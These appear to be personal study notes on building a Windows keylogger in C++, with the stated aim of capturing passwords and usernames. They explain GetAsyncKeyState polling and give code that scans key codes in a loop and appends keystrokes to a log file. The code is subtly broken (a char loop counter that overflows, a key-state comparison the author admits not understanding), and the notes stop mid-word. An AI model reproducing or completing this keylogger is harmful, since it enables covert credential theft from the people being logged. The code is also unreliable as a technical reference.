**Title:** ILY - Keylogger
**Tags:** [[ILY - Easy]]
**Topics:**

---
# ILY - Keylogger
# General
## First Iteration
### void startLogging();
It is not possible to know which key has been pressed after it happened, so the only way to detect it is to check all possible valid keys in the ASCII symbols every time. Due to our goal of capturing passwords and usernames, the last valid symbol is "¡", which has the number 173.

Now that we are checking all possible characters, it is important to determine how we are going to get that "alarm" informing us that a key on the keyboard has been pressed. This is where `GetAsyncKeyState()` comes into play.

`GetKeyState()` will return that a key has been pressed only if it happens in the same "instant"; otherwise, it will not detect it. This isn't really convenient in our case, so we will use `GetAsyncKeyState()` instead, because it can retrieve the state of a key pressed at any time.

It's important to understand how `GetAsyncKeyState()` works and the best way to implement it. You will see three types of implementations:
- `GetAsyncKeyState(key) == -32767`: Verifies if a key has been pressed and released.
- `GetAsyncKeyState(key) & 0x0001`: Verifies if a key has been pressed since the last call.
- `GetAsyncKeyState(key) & 0x8000`: Verifies if a key is currently being pressed.
[//]: Note that (0xFFFF8001)Hexa == (-32767)Ca2

```ad-question
I do not fully understand why the keylogger only works correctly when I set `0xFFFF8001` and why it captures the key while I maintain it pressed.
```

Finally, for readability purposes, we want to process special characters to log them in a special format. Otherwise, we just log the key directly.

```c++
for (char key = 8; key<=173; key++) {
	if (GetAsyncKeyState(key) == 0xFFFF8001) {
	    if (not specialKey(key)) {
            string str(1, key);
            save(str);
        }
    }
}
```

### void save(const string& input);
Firstly we need to create a new datatype to work with files. For this reason we must include `#include <iostream>` and `#include <fstream>`.
Due of how "fstream" is defined, its more convenient to use `fstream`.

```ad-info
**fstream**
This data type represents the file stream generally, and has the capabilities of both ofstream and ifstream which means it can create files, write information to files, and read information from files.
```

Afterwar

```c++
void save(const string& input) {
    fstream LogFile;
    
    LogFile.open("log.txt", fstream::app);  // If it does not exists, it will create it.
    
    if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}
```
